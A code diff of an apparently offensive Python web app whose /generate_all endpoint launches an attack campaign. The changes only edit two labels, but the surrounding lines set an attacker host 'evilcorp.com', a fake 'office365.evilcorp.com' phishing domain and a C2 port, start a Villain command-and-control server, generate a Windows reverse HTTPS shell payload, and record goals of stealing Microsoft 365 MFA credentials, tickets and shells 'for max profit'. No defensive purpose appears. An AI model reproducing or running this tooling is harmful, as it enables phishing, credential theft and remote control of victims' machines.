@@ -9,7 +9,7 @@ app.mount("/static", StaticFiles(directory="static"), name="static")
 
 @app.get("/generate_all")
 async def generate_all():
-    log = "Deathstalker 2025 global death exploits launching max:\n\n"
+    log = "Deathstalker 2025 no docker global death exploits launching max:\n\n"
     config = {"lhost": "evilcorp.com", "phish_domain": "office365.evilcorp.com", "c2_port": 443, "scan_ip": "10.10.10.0/24"}
     try:
         with open("config.json") as f: config.update(json.load(f))
@@ -39,7 +39,7 @@ async def generate_all():
     bg(["villain", "server", "start", "http", "192.168.45.10:8080"])
     run(["villain", "generate", "windows", "reverse_https", f"LHOST={config['lhost']}", f"LPORT=443"])
 
-    ops = [{"deathstalker_2025_global_domination": "full_m365_mfa_creds_tickets_shells_scans_live_max_profit"}]
+    ops = [{"deathstalker_2025_no_docker_global_domination": "full_m365_mfa_creds_tickets_shells_scans_live_max_profit_native"}]
     with open("opportunities.json", "w") as f: json.dump(ops, f, indent=2)
 
     return {"opportunities": ops, "log": log}
